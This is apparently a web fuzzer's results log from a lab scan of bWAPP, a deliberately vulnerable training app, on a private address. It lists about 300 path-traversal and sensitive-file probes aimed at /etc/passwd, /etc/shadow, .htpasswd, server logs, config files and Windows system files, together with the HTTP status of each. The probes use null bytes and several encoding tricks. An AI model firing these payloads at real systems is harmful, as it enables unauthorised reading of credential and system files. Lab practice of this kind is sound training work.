171,200,75L,140W,http://192.168.1.86/bWAPP/install.php
163,200,0L,0W,http://192.168.1.86/bWAPP/config.inc.php
18,302,0L,0W,http://192.168.1.86/bWAPP/
20,302,0L,0W,http://192.168.1.86/bWAPP/
2,302,0L,0W,http://192.168.1.86/bWAPP/
4,302,0L,0W,http://192.168.1.86/bWAPP/
6,302,0L,0W,http://192.168.1.86/bWAPP/
8,302,0L,0W,http://192.168.1.86/bWAPP/
10,302,0L,0W,http://192.168.1.86/bWAPP/
22,302,0L,0W,http://192.168.1.86/bWAPP/
12,302,0L,0W,http://192.168.1.86/bWAPP/
14,302,0L,0W,http://192.168.1.86/bWAPP/
16,302,0L,0W,http://192.168.1.86/bWAPP/
24,302,0L,0W,http://192.168.1.86/bWAPP/
26,302,0L,0W,http://192.168.1.86/bWAPP/
28,302,0L,0W,http://192.168.1.86/bWAPP/
32,302,0L,0W,http://192.168.1.86/bWAPP/
30,302,0L,0W,http://192.168.1.86/bWAPP/
34,302,0L,0W,http://192.168.1.86/bWAPP/
44,302,0L,0W,http://192.168.1.86/bWAPP/
42,302,0L,0W,http://192.168.1.86/bWAPP/
40,302,0L,0W,http://192.168.1.86/bWAPP/
74,302,0L,0W,http://192.168.1.86/bWAPP/
76,302,0L,0W,http://192.168.1.86/bWAPP/
86,302,0L,0W,http://192.168.1.86/bWAPP/
82,302,0L,0W,http://192.168.1.86/bWAPP/
90,302,0L,0W,http://192.168.1.86/bWAPP/
80,302,0L,0W,http://192.168.1.86/bWAPP/
104,302,0L,0W,http://192.168.1.86/bWAPP/
46,302,0L,0W,http://192.168.1.86/bWAPP/
36,302,0L,0W,http://192.168.1.86/bWAPP/
106,302,0L,0W,http://192.168.1.86/bWAPP/
108,302,0L,0W,http://192.168.1.86/bWAPP/
38,302,0L,0W,http://192.168.1.86/bWAPP/
60,302,0L,0W,http://192.168.1.86/bWAPP/
120,302,0L,0W,http://192.168.1.86/bWAPP/
118,302,0L,0W,http://192.168.1.86/bWAPP/
62,302,0L,0W,http://192.168.1.86/bWAPP/
122,302,0L,0W,http://192.168.1.86/bWAPP/
126,302,0L,0W,http://192.168.1.86/bWAPP/
124,302,0L,0W,http://192.168.1.86/bWAPP/
128,302,0L,0W,http://192.168.1.86/bWAPP/
64,302,0L,0W,http://192.168.1.86/bWAPP/
130,302,0L,0W,http://192.168.1.86/bWAPP/
66,302,0L,0W,http://192.168.1.86/bWAPP/
138,302,0L,0W,http://192.168.1.86/bWAPP/
136,302,0L,0W,http://192.168.1.86/bWAPP/
88,302,0L,0W,http://192.168.1.86/bWAPP/
147,302,0L,0W,http://192.168.1.86/bWAPP/
149,302,0L,0W,http://192.168.1.86/bWAPP/
152,302,0L,0W,http://192.168.1.86/bWAPP/
92,302,0L,0W,http://192.168.1.86/bWAPP/
94,302,0L,0W,http://192.168.1.86/bWAPP/
168,302,0L,0W,http://192.168.1.86/bWAPP/
68,302,0L,0W,http://192.168.1.86/bWAPP/
174,302,0L,0W,http://192.168.1.86/bWAPP/
178,302,0L,0W,http://192.168.1.86/bWAPP/
70,302,0L,0W,http://192.168.1.86/bWAPP/
182,302,0L,0W,http://192.168.1.86/bWAPP/
185,302,0L,0W,http://192.168.1.86/bWAPP/
180,302,0L,0W,http://192.168.1.86/bWAPP/
172,302,0L,0W,http://192.168.1.86/bWAPP/
186,302,0L,0W,http://192.168.1.86/bWAPP/
176,302,0L,0W,http://192.168.1.86/bWAPP/
72,302,0L,0W,http://192.168.1.86/bWAPP/
195,302,0L,0W,http://192.168.1.86/bWAPP/
193,302,0L,0W,http://192.168.1.86/bWAPP/
199,302,0L,0W,http://192.168.1.86/bWAPP/
201,302,0L,0W,http://192.168.1.86/bWAPP/
207,302,0L,0W,http://192.168.1.86/bWAPP/
203,302,0L,0W,http://192.168.1.86/bWAPP/
205,302,0L,0W,http://192.168.1.86/bWAPP/
210,302,0L,0W,http://192.168.1.86/bWAPP/
212,302,0L,0W,http://192.168.1.86/bWAPP/
214,302,0L,0W,http://192.168.1.86/bWAPP/
222,302,0L,0W,http://192.168.1.86/bWAPP/
225,302,0L,0W,http://192.168.1.86/bWAPP/
232,302,0L,0W,http://192.168.1.86/bWAPP/
234,302,0L,0W,http://192.168.1.86/bWAPP/
238,302,0L,0W,http://192.168.1.86/bWAPP/
96,302,0L,0W,http://192.168.1.86/bWAPP/
245,302,0L,0W,http://192.168.1.86/bWAPP/
248,302,0L,0W,http://192.168.1.86/bWAPP/
250,302,0L,0W,http://192.168.1.86/bWAPP/
254,302,0L,0W,http://192.168.1.86/bWAPP/
252,302,0L,0W,http://192.168.1.86/bWAPP/
242,302,0L,0W,http://192.168.1.86/bWAPP/
262,302,0L,0W,http://192.168.1.86/bWAPP/
260,302,0L,0W,http://192.168.1.86/bWAPP/
264,302,0L,0W,http://192.168.1.86/bWAPP/
258,302,0L,0W,http://192.168.1.86/bWAPP/
269,302,0L,0W,http://192.168.1.86/bWAPP/
236,302,0L,0W,http://192.168.1.86/bWAPP/
98,302,0L,0W,http://192.168.1.86/bWAPP/
277,302,0L,0W,http://192.168.1.86/bWAPP/
100,302,0L,0W,http://192.168.1.86/bWAPP/
283,302,0L,0W,http://192.168.1.86/bWAPP/
285,302,0L,0W,http://192.168.1.86/bWAPP/
281,302,0L,0W,http://192.168.1.86/bWAPP/
110,302,0L,0W,http://192.168.1.86/bWAPP/
291,302,0L,0W,http://192.168.1.86/bWAPP/
295,302,0L,0W,http://192.168.1.86/bWAPP/
293,302,0L,0W,http://192.168.1.86/bWAPP/
287,302,0L,0W,http://192.168.1.86/bWAPP/
289,302,0L,0W,http://192.168.1.86/bWAPP/
102,302,0L,0W,http://192.168.1.86/bWAPP/
132,302,0L,0W,http://192.168.1.86/bWAPP/
279,302,0L,0W,http://192.168.1.86/bWAPP/
112,302,0L,0W,http://192.168.1.86/bWAPP/
140,302,0L,0W,http://192.168.1.86/bWAPP/
197,302,0L,0W,http://192.168.1.86/bWAPP/
116,302,0L,0W,http://192.168.1.86/bWAPP/
50,302,0L,0W,http://192.168.1.86/bWAPP/
227,302,0L,0W,http://192.168.1.86/bWAPP/
52,302,0L,0W,http://192.168.1.86/bWAPP/
56,302,0L,0W,http://192.168.1.86/bWAPP/
54,302,0L,0W,http://192.168.1.86/bWAPP/
84,302,0L,0W,http://192.168.1.86/bWAPP/
229,302,0L,0W,http://192.168.1.86/bWAPP/
58,302,0L,0W,http://192.168.1.86/bWAPP/
48,302,0L,0W,http://192.168.1.86/bWAPP/
78,302,0L,0W,http://192.168.1.86/bWAPP/
134,302,0L,0W,http://192.168.1.86/bWAPP/
21,400,10L,42W,http://192.168.1.86/bWAPP/../../../etc/passwd
17,400,10L,42W,http://192.168.1.86/bWAPP/../../etc/passwd
25,400,10L,42W,http://192.168.1.86/bWAPP/../../../../etc/passwd
29,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../etc/passwd
33,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../etc/passwd
41,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../etc/passwd
37,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../etc/passwd
45,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../etc/passwd
73,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../etc/passwd
77,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../../etc/passwd
107,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../dev
105,400,10L,42W,http://192.168.1.86/bWAPP/../../../administrator/inbox
97,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../../../../../../../etc/passwd
81,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../../../etc/passwd
61,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../etc/passwd
65,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../etc/passwd
93,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../../../../../../etc/passwd
69,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../etc/passwd
188,400,10L,42W,http://192.168.1.86/bWAPP/../../windows/win.ini
217,400,10L,42W,http://192.168.1.86/bWAPP/../../apache/logs/error.log
220,400,10L,42W,http://192.168.1.86/bWAPP/../../../apache/logs/access.log
221,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../etc/httpd/logs/acces_log
223,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../etc/httpd/logs/acces.log
224,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../etc/httpd/logs/error_log
228,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../var/www/logs/access_log
226,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../etc/httpd/logs/error.log
230,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../var/www/logs/access.log
219,400,10L,42W,http://192.168.1.86/bWAPP/../../../apache/logs/error.log
233,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../usr/local/apache/logs/access.%20log
235,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../var/log/apache/access_log
218,400,10L,42W,http://192.168.1.86/bWAPP/../../apache/logs/access.log
231,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../usr/local/apache/logs/access_%20log
237,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../var/log/apache2/access_log
239,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../var/log/apache/access.log
243,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../var/log/access.log
240,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../var/log/apache2/access.log
241,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../var/log/access_log
246,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../var/www/logs/error.log
249,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../usr/local/apache/logs/error.l%20og
244,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../var/www/logs/error_log
247,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../usr/local/apache/logs/error_l%20og
255,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../var/log/apache/error.log
256,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../var/log/apache2/error.log
259,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../var/log/error.log
253,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../var/log/apache2/error_log
251,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../var/log/apache/error_log
257,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../var/log/error_log
103,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../etc/passwd&=%3C%3C%3C%3C
57,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../etc/passwd
49,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../etc/passwd
53,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../etc/passwd
89,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../../../../../etc/passwd
85,400,10L,42W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../../../../etc/passwd
167,400,10L,42W,http://192.168.1.86/bWAPP//../../../../pswd
117,403,10L,37W,http://192.168.1.86/bWAPP//.htpasswd
115,403,10L,37W,http://192.168.1.86/bWAPP/.htpasswd
109,403,10L,37W,http://192.168.1.86/bWAPP/.htpasswd
119,403,10L,37W,http://192.168.1.86/bWAPP/../.htpasswd
19,404,9L,39W,http://192.168.1.86/bWAPP/../../etc/passwd%00
1,404,9L,39W,http://192.168.1.86/bWAPP/﻿/etc/master.passwd
3,404,9L,39W,http://192.168.1.86/bWAPP//master.passwd
5,404,9L,39W,http://192.168.1.86/bWAPP/etc/passwd
7,404,9L,39W,http://192.168.1.86/bWAPP/etc/shadow%00
9,404,9L,39W,http://192.168.1.86/bWAPP//etc/passwd
11,404,9L,39W,http://192.168.1.86/bWAPP//etc/passwd%00
13,404,9L,39W,http://192.168.1.86/bWAPP/../etc/passwd
15,404,9L,39W,http://192.168.1.86/bWAPP/../etc/passwd%00
23,404,9L,39W,http://192.168.1.86/bWAPP/../../../etc/passwd%00
27,404,9L,39W,http://192.168.1.86/bWAPP/../../../../etc/passwd%00
31,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../etc/passwd%00
43,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../../etc/passwd%00
39,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../etc/passwd%00
75,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../etc/passwd%00
83,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../../../etc/passwd%00
35,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../etc/passwd%00
79,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../../etc/passwd%00
91,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../../../../../etc/passwd%00
121,404,9L,39W,http://192.168.1.86/bWAPP/.passwd
125,404,9L,39W,http://192.168.1.86/bWAPP/../.passwd
113,404,9L,39W,http://192.168.1.86/bWAPP/passwd.dat
129,404,9L,39W,http://192.168.1.86/bWAPP/../.pass
63,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../etc/passwd%00
131,404,9L,39W,http://192.168.1.86/bWAPP/members/.htpasswd
133,404,9L,39W,http://192.168.1.86/bWAPP/member/.htpasswd
137,404,9L,39W,http://192.168.1.86/bWAPP/users/.htpasswd
139,404,9L,39W,http://192.168.1.86/bWAPP/root/.htpasswd
135,404,9L,39W,http://192.168.1.86/bWAPP/user/.htpasswd
67,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../etc/passwd%00
87,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../../../../etc/passwd%00
144,404,9L,39W,http://192.168.1.86/bWAPP/database.js
145,404,9L,39W,http://192.168.1.86/bWAPP/database.php
146,404,9L,40W,http://192.168.1.86/bWAPP/dbase.php%20a
148,404,9L,39W,http://192.168.1.86/bWAPP/admin/access_log
154,404,9L,39W,http://192.168.1.86/bWAPP/config.php
153,404,9L,39W,http://192.168.1.86/bWAPP//core/config.php
150,404,9L,39W,http://192.168.1.86/bWAPP/../users.db.php
151,404,9L,39W,http://192.168.1.86/bWAPP/users.db.php
155,404,9L,39W,http://192.168.1.86/bWAPP/config.js
156,404,9L,39W,http://192.168.1.86/bWAPP/../config.js
158,404,9L,39W,http://192.168.1.86/bWAPP/../config.asp
157,404,9L,39W,http://192.168.1.86/bWAPP/config.asp
162,404,9L,39W,http://192.168.1.86/bWAPP/../config.php
164,404,9L,39W,http://192.168.1.86/bWAPP/../config.inc.php
159,404,9L,39W,http://192.168.1.86/bWAPP/_config.php
166,404,9L,39W,http://192.168.1.86/bWAPP/../config.asp
169,404,9L,39W,http://192.168.1.86/bWAPP//admin/install.php
165,404,9L,39W,http://192.168.1.86/bWAPP//config.asp
170,404,9L,39W,http://192.168.1.86/bWAPP/../install.php
173,404,9L,39W,http://192.168.1.86/bWAPP/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
175,404,9L,39W,http://192.168.1.86/bWAPP/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow
177,404,9L,39W,http://192.168.1.86/bWAPP/..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
183,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini
179,404,9L,39W,http://192.168.1.86/bWAPP/..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow
190,404,9L,39W,http://192.168.1.86/bWAPP/..\../..\../boot.ini
189,404,9L,39W,http://192.168.1.86/bWAPP/..//..//..//..//..//boot.ini
184,404,9L,39W,http://192.168.1.86/bWAPP//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
192,404,9L,39W,http://192.168.1.86/bWAPP/\…..\\\…..\\\…..\\\
187,404,9L,39W,http://192.168.1.86/bWAPP//..\..\..\..\..\..\winnt\win.ini
71,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../etc/passwd%00
95,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../../../../../../etc/passwd%00
196,404,9L,39W,http://192.168.1.86/bWAPP/d:\AppServ\MySQL
198,404,9L,39W,http://192.168.1.86/bWAPP/c:\AppServ\MySQL
206,404,9L,39W,http://192.168.1.86/bWAPP//C:/inetpub/ftproot/
202,404,9L,40W,http://192.168.1.86/bWAPP//C:\Program%20Files\
200,404,9L,39W,http://192.168.1.86/bWAPP/c:WINDOWS/system32/
208,404,9L,39W,http://192.168.1.86/bWAPP//boot/grub/grub.conf
211,404,9L,39W,http://192.168.1.86/bWAPP//proc/cpuinfo
209,404,9L,39W,http://192.168.1.86/bWAPP//proc/interrupts
215,404,9L,39W,http://192.168.1.86/bWAPP/../apache/logs/error.log
213,404,9L,39W,http://192.168.1.86/bWAPP//proc/meminfo
216,404,9L,39W,http://192.168.1.86/bWAPP/../apache/logs/access.log
204,404,9L,40W,http://192.168.1.86/bWAPP//D:\Program%20Files\
123,404,9L,39W,http://192.168.1.86/bWAPP//.passwd
261,404,9L,39W,http://192.168.1.86/bWAPP//etc/init.d/apache
265,404,9L,39W,http://192.168.1.86/bWAPP//etc/httpd/httpd.conf
266,404,9L,39W,http://192.168.1.86/bWAPP//etc/apache/apache.conf
268,404,9L,39W,http://192.168.1.86/bWAPP//etc/apache2/apache2.conf
272,404,9L,39W,http://192.168.1.86/bWAPP//usr/local/apache/conf/httpd.conf
273,404,9L,39W,http://192.168.1.86/bWAPP//opt/apache/conf/httpd.conf
274,404,9L,39W,http://192.168.1.86/bWAPP//home/apache/httpd.conf
275,404,9L,39W,http://192.168.1.86/bWAPP//home/apache/conf/httpd.conf
99,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00
276,404,9L,39W,http://192.168.1.86/bWAPP//etc/apache2/sites-available/default
278,404,9L,39W,http://192.168.1.86/bWAPP//etc/apache2/vhosts.d/default_vhost.include
284,404,9L,39W,http://192.168.1.86/bWAPP//etc/group
282,404,9L,39W,http://192.168.1.86/bWAPP//etc/shadow
286,404,9L,39W,http://192.168.1.86/bWAPP//etc/security/group
292,404,9L,39W,http://192.168.1.86/bWAPP//etc/security/environ
288,404,9L,39W,http://192.168.1.86/bWAPP//etc/security/passwd
296,404,9L,39W,http://192.168.1.86/bWAPP//usr/lib/security/mkuser.default
294,404,9L,39W,http://192.168.1.86/bWAPP//etc/security/limits
290,404,9L,39W,http://192.168.1.86/bWAPP//etc/security/user
114,404,9L,39W,http://192.168.1.86/bWAPP/pass.dat
194,404,9L,42W,http://192.168.1.86/bWAPP/=3D%20“/..”%20.%20“%2f..
101,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../../../../../../../../../../../etc/shadow%00
111,404,9L,39W,http://192.168.1.86/bWAPP/passwd
271,404,9L,39W,http://192.168.1.86/bWAPP//usr/local/apache2/conf/httpd.conf
141,404,9L,39W,http://192.168.1.86/bWAPP/db.php
191,404,9L,39W,http://192.168.1.86/bWAPP/..\../..\../..\../..\../boot.ini
270,404,9L,39W,http://192.168.1.86/bWAPP//etc/apache2/httpd.conf
280,404,9L,39W,http://192.168.1.86/bWAPP//etc/passwd
142,404,9L,39W,http://192.168.1.86/bWAPP/data.php
143,404,9L,39W,http://192.168.1.86/bWAPP/database.asp
127,404,9L,39W,http://192.168.1.86/bWAPP/.pass
181,404,9L,39W,http://192.168.1.86/bWAPP/..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed
267,404,9L,39W,http://192.168.1.86/bWAPP//etc/apache/httpd.conf
51,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../../../../etc/passwd%00
55,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../../../../../etc/passwd%00
59,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../../../../../../etc/passwd%00
161,404,9L,39W,http://192.168.1.86/bWAPP/../_config.php%00
47,404,9L,39W,http://192.168.1.86/bWAPP/../../../../../../../../../etc/passwd%00
263,404,9L,39W,http://192.168.1.86/bWAPP//etc/init.d/apache2
160,404,9L,39W,http://192.168.1.86/bWAPP/../_config.php
